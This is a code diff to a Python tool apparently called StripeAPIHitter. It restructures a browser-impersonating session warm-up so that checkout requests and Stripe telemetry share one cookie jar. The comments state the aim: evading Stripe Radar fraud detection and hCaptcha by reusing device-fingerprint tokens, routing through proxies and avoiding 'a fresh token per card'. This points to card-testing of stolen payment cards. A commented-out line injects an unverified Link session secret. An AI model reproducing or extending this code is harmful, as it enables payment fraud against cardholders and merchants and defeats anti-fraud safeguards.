@@ -952,17 +952,40 @@ class StripeAPIHitter:
                 if proxy_data and address.get('country'):
                     ProxyManager._geo_cache[proxy_data.get('server', '')] = address['country']
                 
-                # Stripe device fingerprint tokens (muid/sid/guid)
-                # Reuse cached session tokens if available — mimics __stripe_mid (1yr) + __stripe_sid (30min)
-                # A fresh token per card is a blatant bot signal to Stripe Radar
-                #
-                # CRITICAL: Create the shared session BEFORE calling generate_stripe_telemetry so
-                # m.stripe.com/6 fires through the same cookie jar as warmup and payment_methods.
-                # Isolated cffi_requests.post() drops cookies → Radar sees orphaned telemetry → hCaptcha
+                # Step 0: Create browser session with persistent cookie jar
                 _cffi_session = cffi_requests.Session(impersonate=profile["impersonate"])
                 if proxies:
                     _cffi_session.proxies = proxies
 
+                # Step 0.1: Browser Session Warm-Up
+                # Get the initial checkout page to populate cookie jar with __stripe_mid and other cookies.
+                # All subsequent requests (telemetry, pre-flights, tokenization) must flow through this same session.
+                rqdata_token = None
+                try:
+                    warmup_headers = {
+                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                        "accept-language": "en-US,en;q=0.9",
+                        "accept-encoding": "gzip, deflate, br",
+                        "sec-fetch-dest": "document",
+                        "sec-fetch-mode": "navigate",
+                        "sec-fetch-site": "none",
+                        "sec-fetch-user": "?1",
+                        "upgrade-insecure-requests": "1",
+                        "user-agent": profile["user_agent"],
+                        "cache-control": "max-age=0"
+                    }
+                    if "sec-ch-ua" in profile: warmup_headers["sec-ch-ua"] = profile["sec-ch-ua"]
+                    if "sec-ch-ua-mobile" in profile: warmup_headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
+                    if "sec-ch-ua-platform" in profile: warmup_headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]
+
+                    warmup_res = await loop.run_in_executor(None, lambda: _cffi_session.get(
+                        checkout_page_url, headers=warmup_headers, timeout=15))
+                except Exception:
+                    pass  # warmup failure is non-fatal — continue
+
+                # Stripe device fingerprint tokens (muid/sid/guid)
+                # Reuse cached session tokens if available — mimics __stripe_mid (1yr) + __stripe_sid (30min)
+                # A fresh token per card is a blatant bot signal to Stripe Radar
                 if cached_stripe_tokens and cached_stripe_tokens.get('muid'):
                     stripe_tokens = cached_stripe_tokens
                 else:
@@ -1030,35 +1053,6 @@ class StripeAPIHitter:
                 #     if link_json.get("client_secret"):
                 #         # Inject the unverified Link session into the PaymentMethod payload
                 #         pm_data["link[credentials][client_secret]"] = link_json["client_secret"]
-                
-                # Step 0: Browser Session Warm-Up (with persistent cookie jar)
-                # Using cffi AsyncSession so cookies set on the warmup GET (stripe_mid, __stripe_mid, etc.)
-                # flow automatically into all subsequent API calls — Radar tracks these for session continuity.
-                # Without shared cookies, Radar sees orphaned API calls → hCaptcha trigger.
-                # NOTE: session already created above before telemetry call
-                rqdata_token = None
-                try:
-                    warmup_headers = {
-                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-                        "accept-language": "en-US,en;q=0.9",
-                        "accept-encoding": "gzip, deflate, br",
-                        "sec-fetch-dest": "document",
-                        "sec-fetch-mode": "navigate",
-                        "sec-fetch-site": "none",
-                        "sec-fetch-user": "?1",
-                        "upgrade-insecure-requests": "1",
-                        "user-agent": profile["user_agent"],
-                        "cache-control": "max-age=0"
-                    }
-                    if "sec-ch-ua" in profile: warmup_headers["sec-ch-ua"] = profile["sec-ch-ua"]
-                    if "sec-ch-ua-mobile" in profile: warmup_headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
-                    if "sec-ch-ua-platform" in profile: warmup_headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]
-
-                    warmup_res = await loop.run_in_executor(None, lambda: _cffi_session.get(
-                        checkout_page_url, headers=warmup_headers, timeout=15))
-                    # rqdata is no longer injected statically by Stripe — skip regex scrape
-                except Exception:
-                    pass  # warmup failure is non-fatal — continue without rqdata
 
                 # Step 0.5: Elements Session Pre-flight Bootstrap (Mimic Browser UI setup)
                 # Helps Radar engine associate the checkout token with elements-session state.
